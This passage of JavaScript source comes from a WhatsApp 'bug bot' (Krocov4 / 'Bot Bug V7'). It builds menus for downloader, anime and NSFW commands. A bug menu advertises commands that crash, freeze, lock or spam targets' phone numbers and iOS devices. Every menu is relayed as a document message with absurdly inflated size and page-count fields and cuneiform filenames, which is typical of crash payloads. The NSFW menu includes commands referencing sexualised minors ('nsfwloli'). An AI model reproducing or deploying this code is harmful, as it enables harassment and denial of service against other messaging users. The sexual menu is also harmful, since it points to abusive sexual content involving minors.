    const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
    const tex = `*[ FACEBOOK DL BY ${global.owner} ]*`;
    const videoBuffer = data.result.HD;
    krocov4.sendMessage(m.chat, { caption: tex, video: { url: videoBuffer} }, { quoted: m });
  } catch (error) {
    replyzz('Yah error kak')
  }
  }
  break
  
 case 'tiktokaudioxx':{
if (!text) return replyzz( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replyzz(`Link Invalid!!`)
replyzz(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
krocov4.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'menu': {
  let vrsnn = require("./package.json")
  let pantek = `
┏─『 INFO TEXT BIASA 』
┃*おい* : *👋🏻 ${pushname}*
┃*所有者の名前*   : *${global.nameowner}*
┃*所有者がいない*  : *${global.owner}*
┃*バージョン*  : *${vrsnn.version}*
┃*今日* : *${hariii}*
┗─────────────❐

┏─『 SIMPEL MENU 』
┃${global.simbol}ⴰBUGMENU
┃${global.simbol}ⴰDOWNLOAD
┃${global.simbol}ⴰVIDEOMENU
┃${global.simbol}ⴰOWNERMENU
┗─────────────❐`;

  // URL dokumen dan gambar
  const documentUrl = "https://mmg.whatsapp.net/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0&mms3=true";
  const imageUrl = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar yang sesuai

  await krocov4.relayMessage(m.chat, {
    documentMessage: {
      url: documentUrl, // URL dokumen
      fileName: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀", // Nama file tanpa spasi
      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", // Pastikan format mime sesuai
      fileSha256: "lauOKMgl7p0KTs2EQ46U72Xk830GnHotnXAFdEbJS1A=",
      fileLength: "52359",
      pageCount: 9999999999,
      mediaKey: "cj5e6khfspzEYbai20dQHLelrGhSJXU+y1uDjvZzeL0=",
      fileEncSha256: "0lmr8rlXVWd7avZLrDAajn7PHF437eH1/+PxHK1S/FI=",
      directPath: "/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1730808559",
      thumbnailDirectPath: imageUrl, // Ganti dengan URL gambar thumbnail yang sesuai
      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
      thumbnailEncSha256: "PPgoPRG6KiqMnw8gMWu7FDhprwXcA1HWMW4h76yWiNI=",
      jpegThumbnail: await resize(doct, 276, 100), // Resize sesuai kebutuhan
      thumbnailHeight: 144,
      thumbnailWidth: 256,
      caption: pantek, // Teks yang ingin dikirimkan
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "⚘¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼¨:·. ⚘"
        }
      }
    }
  }, {});
}
break;

case 'bugmenu': {
  let vrsnn = require("./package.json")
  let bugmenu = `
┏─『 INFO TEXT BIASA 』
┃*おい* : *👋🏻 ${pushname}*
┃*所有者の名前*   : *${global.nameowner}*
┃*所有者がいない*  : *${global.owner}*
┃*バージョン*  : *${vrsnn.version}*
┃*今日* : *${hariii}*
┗─────────────❐

┏─『 BUG KHUSUS ORI 』
┃${global.simbol}ⴰFreezehome 62xxx
┃${global.simbol}ⴰOribug 62xxx
┃${global.simbol}ⴰkangcrott 62xxx
┗─────────────❐
┏─『 BUG KHUSUS IP/IOS 』
┃${global.simbol}ⴰCrashall 62xxx
┃${global.simbol}ⴰCrashjid 62xxx
┃${global.simbol}ⴰIosfreze 62xxx
┗─────────────❐`;
  
 // URL dokumen dan gambar
  const documentUrl = "https://mmg.whatsapp.net/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0&mms3=true";
  const imageUrl = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar yang sesuai

  await krocov4.relayMessage(m.chat, {
    documentMessage: {
      url: documentUrl, // URL dokumen
      fileName: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀", // Nama file tanpa spasi
      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", // Pastikan format mime sesuai
      fileSha256: "lauOKMgl7p0KTs2EQ46U72Xk830GnHotnXAFdEbJS1A=",
      fileLength: "52359",
      pageCount: 9999999999,
      mediaKey: "cj5e6khfspzEYbai20dQHLelrGhSJXU+y1uDjvZzeL0=",
      fileEncSha256: "0lmr8rlXVWd7avZLrDAajn7PHF437eH1/+PxHK1S/FI=",
      directPath: "/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1730808559",
      thumbnailDirectPath: imageUrl, // Ganti dengan URL gambar thumbnail yang sesuai
      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
      thumbnailEncSha256: "PPgoPRG6KiqMnw8gMWu7FDhprwXcA1HWMW4h76yWiNI=",
      jpegThumbnail: await resize(doct, 276, 100), // Resize sesuai kebutuhan
      thumbnailHeight: 144,
      thumbnailWidth: 256,
      caption: bugmenu, // Teks yang ingin dikirimkan
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "⚘¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼¨:·. ⚘"
        }
      }
    }
  }, {});
}
break;


case 'download':{
const vrsnn = require("./package.json")
let download = `
┏─『 INFO TEXT BIASA 』
┃*おい* : *👋🏻 ${pushname}*
┃*所有者の名前*   : *${global.nameowner}*
┃*所有者がいない*  : *${global.owner}*
┃*バージョン*  : *${vrsnn.version}*
┃*今日* : *${hariii}*
┗─────────────❐

┏─『 DOWNLOAD MENU 』
┃${global.simbol}ⴰtiktok link
┃${global.simbol}ⴰfacebook link
┃${global.simbol}ⴰttslide link image
┃${global.simbol}ⴰtiktokaudioxx link
┃${global.simbol}ⴰmediafire
┃${global.simbol}ⴰcapcut link
┗─────────────❐`;


 // URL dokumen dan gambar
  const documentUrl = "https://mmg.whatsapp.net/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0&mms3=true";
  const imageUrl = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar yang sesuai

  await krocov4.relayMessage(m.chat, {
    documentMessage: {
      url: documentUrl, // URL dokumen
      fileName: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀", // Nama file tanpa spasi
      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", // Pastikan format mime sesuai
      fileSha256: "lauOKMgl7p0KTs2EQ46U72Xk830GnHotnXAFdEbJS1A=",
      fileLength: "52359",
      pageCount: 9999999999,
      mediaKey: "cj5e6khfspzEYbai20dQHLelrGhSJXU+y1uDjvZzeL0=",
      fileEncSha256: "0lmr8rlXVWd7avZLrDAajn7PHF437eH1/+PxHK1S/FI=",
      directPath: "/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1730808559",
      thumbnailDirectPath: imageUrl, // Ganti dengan URL gambar thumbnail yang sesuai
      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
      thumbnailEncSha256: "PPgoPRG6KiqMnw8gMWu7FDhprwXcA1HWMW4h76yWiNI=",
      jpegThumbnail: await resize(doct, 276, 100), // Resize sesuai kebutuhan
      thumbnailHeight: 144,
      thumbnailWidth: 256,
      caption: download, // Teks yang ingin dikirimkan
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "⚘¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼¨:·. ⚘"
        }
      }
    }
  }, {});
}
break;

case 'videomenu':{
let vrsnn = require("./package.json")
let video = `
┏─『 INFO TEXT BIASA 』
┃*おい* : *👋🏻 ${pushname}*
┃*所有者の名前*   : *${global.nameowner}*
┃*所有者がいない*  : *${global.owner}*
┃*バージョン*  : *${vrsnn.version}*
┃*今日* : *${hariii}*
┗─────────────❐

┏─『 VIDEO MENU 』
┃${global.simbol}ⴰtiktokghea
┃${global.simbol}ⴰtiktokpanrika
┃${global.simbol}ⴰtiktokbocil
┃${global.simbol}ⴰtiktoknukhty
┃${global.simbol}ⴰtiktoksantuy
┃${global.simbol}ⴰtiktokgirl
┃${global.simbol}ⴰtiktoknotnot
┃${global.simbol}ⴰtiktokkayes
┃${global.simbol}ⴰpap foto/video
┗─────────────❐`
 // URL dokumen dan gambar
  const documentUrl = "https://mmg.whatsapp.net/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0&mms3=true";
  const imageUrl = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar yang sesuai

  await krocov4.relayMessage(m.chat, {
    documentMessage: {
      url: documentUrl, // URL dokumen
      fileName: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀", // Nama file tanpa spasi
      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", // Pastikan format mime sesuai
      fileSha256: "lauOKMgl7p0KTs2EQ46U72Xk830GnHotnXAFdEbJS1A=",
      fileLength: "52359",
      pageCount: 9999999999,
      mediaKey: "cj5e6khfspzEYbai20dQHLelrGhSJXU+y1uDjvZzeL0=",
      fileEncSha256: "0lmr8rlXVWd7avZLrDAajn7PHF437eH1/+PxHK1S/FI=",
      directPath: "/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1730808559",
      thumbnailDirectPath: imageUrl, // Ganti dengan URL gambar thumbnail yang sesuai
      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
      thumbnailEncSha256: "PPgoPRG6KiqMnw8gMWu7FDhprwXcA1HWMW4h76yWiNI=",
      jpegThumbnail: await resize(doct, 276, 100), // Resize sesuai kebutuhan
      thumbnailHeight: 144,
      thumbnailWidth: 256,
      caption: video, // Teks yang ingin dikirimkan
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "⚘.·:¨ ¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼¨:·. ⚘"
        }
      }
    }
  }, {});
}
break;

/*
case 'download':{
const vrsnn = require("./package.json")
let download = `
▬▭▬▭⌜ メニュー表示 ⌟▬▭▬▭
*おい* : *👋🏻 ${pushname}*

*"Halo! Saya adalah Bot Bug WhatsApp yang dirancang oleh Developer AkmalMods. Silakan pilih menu yang tersedia untuk melanjutkan. Terima kasih!"*
*バージョン*  : *${vrsnn.version}*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
${global.simbol}ⴰtiktok link
${global.simbol}ⴰfacebook link
${global.simbol}ⴰttslide link image
${global.simbol}ⴰtiktokaudioxx link
${global.simbol}ⴰmediafire
${global.simbol}ⴰcapcut link
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
 // URL dokumen dan gambar
  const documentUrl = "https://mmg.whatsapp.net/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0&mms3=true";
  const imageUrl = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar yang sesuai

  await krocov4.relayMessage(m.chat, {
    documentMessage: {
      url: documentUrl, // URL dokumen
      fileName: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀", // Nama file tanpa spasi
      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", // Pastikan format mime sesuai
      fileSha256: "lauOKMgl7p0KTs2EQ46U72Xk830GnHotnXAFdEbJS1A=",
      fileLength: "52359",
      pageCount: 9999999999,
      mediaKey: "cj5e6khfspzEYbai20dQHLelrGhSJXU+y1uDjvZzeL0=",
      fileEncSha256: "0lmr8rlXVWd7avZLrDAajn7PHF437eH1/+PxHK1S/FI=",
      directPath: "/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1730808559",
      thumbnailDirectPath: imageUrl, // Ganti dengan URL gambar thumbnail yang sesuai
      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
      thumbnailEncSha256: "PPgoPRG6KiqMnw8gMWu7FDhprwXcA1HWMW4h76yWiNI=",
      jpegThumbnail: await resize(doct, 276, 100), // Resize sesuai kebutuhan
      thumbnailHeight: 144,
      thumbnailWidth: 256,
      caption: download, // Teks yang ingin dikirimkan
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "⚘.·:¨ ¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼¨:·. ⚘"
        }
      }
    }
  }, {});
}
break*/

case 'tools':{
const vrsnn = require("./package.json")
const tools = `
▬▭▬▭⌜ メニュー表示 ⌟▬▭▬▭
*おい* : *👋🏻 ${pushname}*

*所有者の名前*   : *${global.nameowner}*
*所有者がいない*  : *${global.owner}*
*バージョン*  : *${vrsnn.version}*
*今日* : *${hariii}*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
${global.simbol}ⴰemojimix
${global.simbol}ⴰsticker
${global.simbol}ⴰencrypt
${global.simbol}ⴰcekidch
${global.simbol}ⴰquotly nama Akmal
${global.simbol}ⴰip-info 8888
${global.simbol}ⴰproxy-checker 88888
${global.simbol}ⴰlockwa 628xxx
${global.simbol}ⴰspam-pair 628xxx
${global.simbol}ⴰnikparser 310xxx
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
let sections = [{
title: '⿻  ⌜ 🌊🌊 𝑥𝓸𒉽 𝐜ɾﾑᏕ𒀂 🌊🌊 ⌟  ⿻',
highlight_label: '❝𝗕𝘂𝗴 𝗠𝗲𝗻𝘂❞',
rows: [{
title: 'バグメニュー', 
id: '.xoxbug'
}]
},
{
highlight_label: '❝𝗥𝗮𝗻𝗱𝗼𝗺❞',
rows: [{
title: 'カチカチノック', 
id: '.video'
}]
},
{
highlight_label: '❝𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱❞',
rows: [{
title: 'ダウンロード', 
id: '.download'
}]
},
{
highlight_label: '❝𝗔𝗻𝗶𝗺𝗲𝗹𝗼𝗴𝗼❞',
rows: [{
title: 'アニメ', 
id: '.anime'
}]
},
{
highlight_label: '❝𝗔𝗻𝗶𝗺𝗲𝗡𝘀𝗳𝘄❞',
rows: [{
title: 'クロット', 
id: '.nsfw'
}]
},
{
highlight_label: '❝𝗧𝗼𝗼𝗹𝘀❞',
rows: [{
title: '近日公開', 
id: '.tools'
}]
},
{
highlight_label: '❝𝗢𝘄𝗻𝗲𝗿❞',
rows: [{
title: '所有者', 
id: '.ownerr'
}]
}]
let listMessage = {
    title: '⿻ ⦍見⦎⦍え⦎⦍な⦎⦍い⦎ ⿻', 
    sections
};

  let freesex = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆`,
                body: `C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s`,
                previewType: "VIDEO",
                thumbnail: doct2,
                sourceUrl: `https://www.youtube.com/@AkmalMods`,
                mediaUrl: `https://www.youtube.com/@AkmalMods`
            }
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: tools
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ''
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...(await prM({ document: doct, fileName: "@6283866354557", fileLength: "9999999999999", pageCount: 9999999999999, mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0", thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=", thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=", jpegThumbnail: (await resize(doct, 276, 100)) })),
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              },
              {
                "name": "cta_url",
                "buttonParamsJson": "{\"display_text\":\"私の創造主\",\"url\":\"https://youtube.com/@AkmalMods\",\"merchant_url\":\"https://youtube.com/@AkmalMods\"}"
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.sender, quoted: extd });

  await krocov4.relayMessage(freesex.key.remoteJid, freesex.message, {
    messageId: freesex.key.id
  });
}
break

case 'ownermenu':{
const vrsnn = require("./package.json")
const ownermenu = `
┏─『 INFO TEXT BIASA 』
┃*おい* : *👋🏻 ${pushname}*
┃*所有者の名前*   : *${global.nameowner}*
┃*所有者がいない*  : *${global.owner}*
┃*バージョン*  : *${vrsnn.version}*
┃*今日* : *${hariii}*
┗─────────────❐

┏─『 OWNER MENU 』
┃${global.simbol}ⴰaddprem
┃${global.simbol}ⴰdelprem
┃${global.simbol}ⴰaddowner
┃${global.simbol}ⴰdelowner 
┗─────────────❐`;

 // URL dokumen dan gambar
  const documentUrl = "https://mmg.whatsapp.net/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0&mms3=true";
  const imageUrl = 'https://files.catbox.moe/8ehkk3.jpg'; // Ganti dengan URL gambar yang sesuai

  await krocov4.relayMessage(m.chat, {
    documentMessage: {
      url: documentUrl, // URL dokumen
      fileName: "𒂵𒂶𒂷𒂸𒂹𒂺𒂻𒂼𒂽𒂾𒂿𒃀", // Nama file tanpa spasi
      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", // Pastikan format mime sesuai
      fileSha256: "lauOKMgl7p0KTs2EQ46U72Xk830GnHotnXAFdEbJS1A=",
      fileLength: "52359",
      pageCount: 9999999999,
      mediaKey: "cj5e6khfspzEYbai20dQHLelrGhSJXU+y1uDjvZzeL0=",
      fileEncSha256: "0lmr8rlXVWd7avZLrDAajn7PHF437eH1/+PxHK1S/FI=",
      directPath: "/v/t62.7119-24/19382291_2764431080393362_5844187716500619812_n.enc?ccb=11-4&oh=01_Q5AaIE9xkZ8dSmZLWRti3aRqsTwADjqxalFKGfP2fg1V4njV&oe=67516C21&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1730808559",
      thumbnailDirectPath: imageUrl, // Ganti dengan URL gambar thumbnail yang sesuai
      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
      thumbnailEncSha256: "PPgoPRG6KiqMnw8gMWu7FDhprwXcA1HWMW4h76yWiNI=",
      jpegThumbnail: await resize(doct, 276, 100), // Resize sesuai kebutuhan
      thumbnailHeight: 144,
      thumbnailWidth: 256,
      caption: ownermenu, // Teks yang ingin dikirimkan
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "⚘¨:·.✼ 𝗦𝗰𝗿𝗽𝗶𝘁𝘀 𝗕𝗼𝘁 𝗕𝘂𝗴 𝗩7 ✼¨:·. ⚘"
        }
      }
    }
  }, {});
}
break;

case 'anime':{
const vrsnn = require("./package.json")
const animelogo = `
▬▭▬▭⌜ メニュー表示 ⌟▬▭▬▭
*おい* : *👋🏻 ${pushname}*

*所有者の名前*   : *${global.nameowner}*
*所有者がいない*  : *${global.owner}*
*バージョン*  : *${vrsnn.version}*
*今日* : *${hariii}*
▬▭▬▭⌜ 所有者 ⌟▬▭▬▭▬
${global.simbol}ⴰyulibocil
${global.simbol}ⴰyumeko
${global.simbol}ⴰyuki
${global.simbol}ⴰyotsuba
${global.simbol}ⴰtsunade
${global.simbol}ⴰtoukachan
${global.simbol}ⴰtechnology
${global.simbol}ⴰshizuka
${global.simbol}ⴰshinomiya
${global.simbol}ⴰprogramming
${global.simbol}ⴰtejina
${global.simbol}ⴰrandomnime
${global.simbol}ⴰshota
${global.simbol}ⴰakiyama
${global.simbol}ⴰspace
${global.simbol}ⴰgamewallpaper
${global.simbol}ⴰshinka
${global.simbol}ⴰnekonime
${global.simbol}ⴰsatanic
${global.simbol}ⴰhacker
${global.simbol}ⴰcosplayloli
${global.simbol}ⴰsakura
${global.simbol}ⴰcosplaysagiri
${global.simbol}ⴰsasuke
${global.simbol}ⴰpokemon
${global.simbol}ⴰrandomnime2
${global.simbol}ⴰcyber
▬▭▬▭⌜ 所有者 ⌟▬▭▬▭`
let sections = [{
title: '⿻  ⌜ 🌊🌊 𝑥𝓸𒉽 𝐜ɾﾑᏕ𒀂 🌊🌊 ⌟  ⿻',
highlight_label: '❝𝗕𝘂𝗴 𝗠𝗲𝗻𝘂❞',
rows: [{
title: 'バグメニュー', 
id: '.xoxbug'
}]
},
{
highlight_label: '❝𝗥𝗮𝗻𝗱𝗼𝗺❞',
rows: [{
title: 'カチカチノック', 
id: '.video'
}]
},
{
highlight_label: '❝𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱❞',
rows: [{
title: 'ダウンロード', 
id: '.download'
}]
},
{
highlight_label: '❝𝗔𝗻𝗶𝗺𝗲𝗹𝗼𝗴𝗼❞',
rows: [{
title: 'アニメ', 
id: '.anime'
}]
},
{
highlight_label: '❝𝗔𝗻𝗶𝗺𝗲𝗡𝘀𝗳𝘄❞',
rows: [{
title: 'クロット', 
id: '.nsfw'
}]
},
{
highlight_label: '❝𝗧𝗼𝗼𝗹𝘀❞',
rows: [{
title: '近日公開', 
id: '.tools'
}]
},
{
highlight_label: '❝𝗢𝘄𝗻𝗲𝗿❞',
rows: [{
title: '所有者', 
id: '.ownerr'
}]
}]
let listMessage = {
    title: '⿻ ⦍見⦎⦍え⦎⦍な⦎⦍い⦎ ⿻', 
    sections
};

  let freesex = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `⋆✩⋆ 𝖪ꮢꂦ𝘤Ø 𝗩7 ⋆✩⋆`,
                body: `C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s`,
                previewType: "VIDEO",
                thumbnail: doct2,
                sourceUrl: `https://www.youtube.com/@AkmalMods`,
                mediaUrl: `https://www.youtube.com/@AkmalMods`
            }
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: animelogo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ''
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: true,
            ...(await prM({ document: doct, fileName: "@6283866354557", fileLength: "9999999999999", pageCount: 9999999999999, mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0", thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=", thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=", jpegThumbnail: (await resize(doct, 276, 100)) })),
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              },
              {
                "name": "cta_url",
                "buttonParamsJson": "{\"display_text\":\"私の創造主\",\"url\":\"https://youtube.com/@AkmalMods\",\"merchant_url\":\"https://youtube.com/@AkmalMods\"}"
              }
            ]
          })
        })
      }
    }
  }, { userJid: m.sender, quoted: extd });

  await krocov4.relayMessage(freesex.key.remoteJid, freesex.message, {
    messageId: freesex.key.id
  });
}
break

case 'nsfw':{
const vrsnn = require("./package.json")
const animecrot = `
▬▭▬▭⌜ メニュー表示 ⌟▬▭▬▭
*おい* : *👋🏻 ${pushname}*

*所有者の名前*   : *${global.nameowner}*
*所有者がいない*  : *${global.owner}*
*バージョン*  : *${vrsnn.version}*
*今日* : *${hariii}*
▬▭▬▭⌜ 所有者 ⌟▬▭▬▭▬
${global.simbol}ⴰtrap
${global.simbol}ⴰhneko
${global.simbol}ⴰgasm
${global.simbol}ⴰnwaifu
${global.simbol}ⴰanimespank
${global.simbol}ⴰbdsm
${global.simbol}ⴰahegao
${global.simbol}ⴰmilf 
${global.simbol}ⴰblowjob
${global.simbol}ⴰcuckold
${global.simbol}ⴰcum
${global.simbol}ⴰeba
${global.simbol}ⴰfemdom
${global.simbol}ⴰero
${global.simbol}ⴰglasses
${global.simbol}ⴰgangbang
${global.simbol}ⴰhentai
${global.simbol}ⴰnsfwloli
${global.simbol}ⴰneko-hentai
▬▭▬▭⌜ 所有者 ⌟▬▭▬▭`
let sections = [{
title: '⿻  ⌜ 🌊🌊 𝑥𝓸𒉽 𝐜ɾﾑᏕ𒀂 🌊🌊 ⌟  ⿻',
highlight_label: '❝𝗕𝘂𝗴 𝗠𝗲𝗻𝘂❞',
rows: [{
title: 'バグメニュー', 
id: '.xoxbug'
}]
},
{
highlight_label: '❝𝗥𝗮𝗻𝗱𝗼𝗺❞',
rows: [{
title: 'カチカチノック', 
id: '.video'
}]
},
{
highlight_label: '❝𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱❞',
rows: [{
title: 'ダウンロード', 
id: '.download'
}]
},
{
highlight_label: '❝𝗔𝗻𝗶𝗺𝗲𝗹𝗼𝗴𝗼❞',
rows: [{
title: 'アニメ', 
id: '.anime'
}]
},
{
highlight_label: '❝𝗔𝗻𝗶𝗺𝗲𝗡𝘀𝗳𝘄❞',
rows: [{
title: 'クロット', 
id: '.nsfw'
}]
},
{
highlight_label: '❝𝗧𝗼𝗼𝗹𝘀❞',
rows: [{
title: '近日公開', 
id: '.tools'
}]
},
{
highlight_label: '❝𝗢𝘄𝗻𝗲𝗿❞',
rows: [{
title: '所有者', 
id: '.ownerr'
}]
}]
let listMessage = {
    title: '⿻ ⦍見⦎⦍え⦎⦍な⦎⦍い⦎ ⿻', 
    sections
};

  let freesex = await generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
